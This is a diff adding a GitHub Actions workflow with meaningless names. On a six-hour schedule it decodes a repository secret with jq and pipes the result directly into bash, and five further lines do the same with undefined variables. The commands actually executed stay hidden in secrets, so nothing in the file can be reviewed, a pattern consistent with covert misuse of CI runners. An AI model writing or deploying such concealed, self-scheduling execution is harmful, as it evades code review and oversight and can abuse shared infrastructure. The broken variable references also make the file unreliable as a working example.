@@ -1,0 +1,21 @@
+name: lulangsanlsl
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lulangsanlsl
+        env:
+          z04: ${{ secrets.z04 }}
+        run: |
+          echo $z04 | jq -r .t111 | /bin/bash
+          echo $q3550 | jq -r .w52353 | /bin/bash
+          echo $ttdd5 | jq -r .z90253 | /bin/bash
+          echo $skg611 | jq -r .stv682 | /bin/bash
+          echo $zole6411 | jq -r .qnh23806 | /bin/bash
+          echo $v6 | jq -r .qrna095 | /bin/bash
+
